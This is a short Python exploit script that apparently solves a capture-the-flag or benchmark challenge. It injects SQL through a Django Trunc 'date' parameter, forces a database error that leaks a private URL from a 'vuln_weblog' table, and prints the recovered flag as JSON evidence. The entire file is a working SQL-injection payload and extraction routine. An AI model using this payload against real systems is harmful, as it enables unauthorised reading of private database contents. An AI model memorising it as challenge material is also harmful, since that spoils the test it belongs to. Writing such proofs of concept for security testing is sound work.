#!/usr/bin/env python3
"""Extract a private log URL through Django Trunc SQL injection."""

import html
import json
import os
import re
import sys
import urllib.error
import urllib.parse
import urllib.request


def extract_url(target_url: str) -> str:
    payload = (
        "minute' || CAST((SELECT url FROM vuln_weblog WHERE id=1) "
        "AS INTEGER)::text || '"
    )
    query = urllib.parse.urlencode({"date": payload})
    request = urllib.request.Request(f"{target_url.rstrip('/')}?{query}")
    try:
        response = urllib.request.urlopen(request, timeout=20)
    except urllib.error.HTTPError as error:
        response = error
    body = html.unescape(response.read().decode("utf-8", errors="replace"))
    if response.status != 500:
        raise RuntimeError(f"expected SQL error, got HTTP {response.status}")
    match = re.search(r'jaylbreak\.win\{[^}\s]+\}', body)
    if match is None:
        raise RuntimeError("SQL error did not disclose the private URL")
    return match.group(0)


def main() -> None:
    target_url = os.environ.get("REMOTE_TARGET_URL")
    if not target_url:
        raise RuntimeError("REMOTE_TARGET_URL is required")
    secret_url = extract_url(target_url)
    print(json.dumps({
        "evidence_payload": {
            "table_name": "vuln_weblog",
            "data": [{"url": secret_url}],
        },
    }))


if __name__ == "__main__":
    try:
        main()
    except (RuntimeError, OSError) as error:
        print(str(error), file=sys.stderr)
        raise SystemExit(1)
